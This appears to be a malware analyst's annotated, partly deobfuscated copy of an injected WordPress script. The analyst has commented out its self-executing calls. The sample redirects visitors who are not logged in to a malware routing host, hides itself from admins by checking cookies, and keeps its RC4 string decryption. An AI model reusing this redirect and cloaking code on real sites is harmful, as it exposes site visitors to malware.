function iifeToDetermineTheArrayOrderForDecryption(getStrings, expectedDecryptionValue) {
    const shiftingStringArray = getStrings();
    while (true) {
        try {
            const valueToVerifyArrayIsOrderedCorrectly = -parseInt(rc4DecryptString(392, "P$SV")) + parseInt(rc4DecryptString(395, "NqBv")) / 2 + parseInt(rc4DecryptString(373, "WG#v")) / 3 + -parseInt(rc4DecryptString(396, "WG#v")) / 4 * (parseInt(rc4DecryptString(398, "WG#v")) / 5) + -parseInt(rc4DecryptString(364, "ISBI")) / 6 * (parseInt(rc4DecryptString(400, "7Bwp")) / 7) + parseInt(rc4DecryptString(412, "WG#v")) / 8 + -parseInt(rc4DecryptString(376, "EXcS")) / 9 * (-parseInt(rc4DecryptString(368, "$%7K")) / 10);
            if (valueToVerifyArrayIsOrderedCorrectly === expectedDecryptionValue) {
                break;
            } else {
                shiftingStringArray.push(shiftingStringArray.shift());
            }
        } catch (e) {
            shiftingStringArray.push(shiftingStringArray.shift());
        }
    }
}

// Comment out self-executing code
// iifeToDetermineTheArrayOrderForDecryption(getStringArray, 249978);

// This function takes the user to a new page which appears to route users randomly to a slew of different malware sites
function redirectPageToRoutingSite() {
    document.location.href = "https://repost.statisticsplatform.com/station";
    window.location.replace("https://repost.statisticsplatform.com/station");
}

// Get the array of strings to be decrypted. The order of this string array is modified by the iife above
function getStringArray() {
    const strings = ["WPaNFbveFe/dHs3cHmoFFW", "W5hcISoMw8kUj25+BG", "CuyFeaa", "W5hcJ8oGcmodo059De7cLG", "WOxcJdbNca", "WQJdNSk/zCkHktFdJ8owmq", "BLBcLa", "WRlcGSoTnfzvW4/dSmowDsJdOW", "W6hdLmo1yW", "W67dNLFcRmk0", "WPaKWObZtSkoFHZdNc3dOG", "mmkTW40", "WOipBtqe", "WOfTheqJ", "WPSnEq", "tCohWQPlWQ8", "W414W5eRdW", "W5BcI8oKamodt2j3BKpcKCoO", "W57dNuldI2S", "W7lcI8kMimkI", "W6/cG8o5p8k3", "WPGvvY84", "mCkEW6VcHCki", "iCkbW6JcH8kv", "W7hcICoQmSkI", "W7j9d8kHlW", "W4ZdVCo4rYa", "ChzuDCk5sCoBWRNcOGK", "bSonpGVdReTKlmoMWQu", "Dmk1EIlcQG", "DCkVxsRcLG", "WPJcVCk9bxveWP/dV8k7lGm", "WQmXE8oeW4ulW6ZcRuO", "WQyKWQ3cIGq", "W4dcQ8k/W6JcVW", "EHFcI34SWQvthIO", "W5BcICoLbmodrvL4yg7cT8o1", "W7lcLmoKFCk1", "WPSpDZVcQa", "W4/cRmoOW6D4WPP0huC", "WPCWW7RcTa", "WO/dU384mq", "WQyYDCk9WOj9W6xcRg3cGc/dSq", "W7adwSkTD39NjufAWPi", "WReEAH7cPW", "W4r6l0ys", "W6tdOmkCsaC", "c8kLt8o9nG", "WOCrttm", "thZcGa", "W5hdGmoHtCoc", "i1pdMNi", "cCoCWOzliCkTW4VcR8oMWR7cMmoH", "W5JcJSoMbCofs3PAuNxcISoI", "uCkFW6mzzG", "WQm0DCkXWOf3W7ZcN33cTsVdKq", "WQZcGqpdOmkcmwpdLCo2eW", "WQDDmg8T"];
    getStringArray = function () {
        return strings;
    };
    return getStringArray();
}

// Remove values that are inlined. These values were decrypted automatically by the deobfuscation tools
// var _0x57d761 = "loggen_in";
// var _0x2417c3 = "wp-settings";

// Similar RC4 decryption as in /final/special-task-event.js in which it is broken down slightly further.
// Ultimately this is just done by javascript-obfuscator.
function rc4DecryptString(_0x39d941) {
    const strings = getStringArray();
    rc4DecryptString = function (stringIndexPlus360, encryptionKey) {
        stringIndexPlus360 = stringIndexPlus360 - 360;
        let stringToDecrypt = strings[stringIndexPlus360];
        if (rc4DecryptString.ntDoGw === undefined) {
            var _0x2753ed = function (_0x1d23c3) {
                var _0x2908b0 = "";
                var _0x1eafb8 = "";
                var _0x76872d = 0;
                var _0x5c5a20;
                var _0xd8acfc;
                for (var _0x4467d2 = 0; _0xd8acfc = _0x1d23c3.charAt(_0x4467d2++); ~_0xd8acfc && (_0x5c5a20 = _0x76872d % 4 ? _0x5c5a20 * 64 + _0xd8acfc : _0xd8acfc, _0x76872d++ % 4) ? _0x2908b0 += String.fromCharCode(255 & _0x5c5a20 >> (-2 * _0x76872d & 6)) : 0) {
                    _0xd8acfc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(_0xd8acfc);
                }
                var _0x548780 = 0;
                for (var _0x5eb873 = _0x2908b0.length; _0x548780 < _0x5eb873; _0x548780++) {
                    _0x1eafb8 += "%" + ("00" + _0x2908b0.charCodeAt(_0x548780).toString(16)).slice(-2);
                }
                return decodeURIComponent(_0x1eafb8);
            };
            var _0x18669d = function (_0x2bf3ff, _0x4837ee) {
                var _0x1ee19c = [];
                var _0x3d08fc = 0;
                var _0x444519;
                var _0x2056f4 = "";
                _0x2bf3ff = _0x2753ed(_0x2bf3ff);
                var _0x49134d;
                for (_0x49134d = 0; _0x49134d < 256; _0x49134d++) {
                    _0x1ee19c[_0x49134d] = _0x49134d;
                }
                for (_0x49134d = 0; _0x49134d < 256; _0x49134d++) {
                    _0x3d08fc = (_0x3d08fc + _0x1ee19c[_0x49134d] + _0x4837ee.charCodeAt(_0x49134d % _0x4837ee.length)) % 256;
                    _0x444519 = _0x1ee19c[_0x49134d];
                    _0x1ee19c[_0x49134d] = _0x1ee19c[_0x3d08fc];
                    _0x1ee19c[_0x3d08fc] = _0x444519;
                }
                _0x49134d = 0;
                _0x3d08fc = 0;
                for (var _0xb2e545 = 0; _0xb2e545 < _0x2bf3ff.length; _0xb2e545++) {
                    _0x49134d = (_0x49134d + 1) % 256;
                    _0x3d08fc = (_0x3d08fc + _0x1ee19c[_0x49134d]) % 256;
                    _0x444519 = _0x1ee19c[_0x49134d];
                    _0x1ee19c[_0x49134d] = _0x1ee19c[_0x3d08fc];
                    _0x1ee19c[_0x3d08fc] = _0x444519;
                    _0x2056f4 += String.fromCharCode(_0x2bf3ff.charCodeAt(_0xb2e545) ^ _0x1ee19c[(_0x1ee19c[_0x49134d] + _0x1ee19c[_0x3d08fc]) % 256]);
                }
                return _0x2056f4;
            };
            rc4DecryptString.djDVKw = _0x18669d;
            rc4DecryptString.ntDoGw = true;
        }
        var _0x4cf249 = strings[0];
        var _0x3f609a = stringIndexPlus360 + _0x4cf249;
        var _0x15e454 = arguments[_0x3f609a];
        if (!_0x15e454) {
            if (rc4DecryptString.DNwKOn === undefined) {
                rc4DecryptString.DNwKOn = true;
            }
            stringToDecrypt = rc4DecryptString.djDVKw(stringToDecrypt, encryptionKey);
            arguments[_0x3f609a] = stringToDecrypt;
        } else {
            stringToDecrypt = _0x15e454;
        }
        return stringToDecrypt;
    };
    return rc4DecryptString(arguments, _0x39d941);
}

// unused variable
var _0x18316c = "wpnl";

// Route the user if they are not logged into Wordpress. Else remove this script
function executeByLoginStatus() {
    if (document.cookie.indexOf("wp-settings") !== -1 == false && document.cookie.indexOf("loggen_in") !== -1 == false) {
        redirectPageToRoutingSite();
    } else if (document.currentScript) {
        document.currentScript.remove();
    }
}

// Remove self-executing code
// executeByLoginStatus();
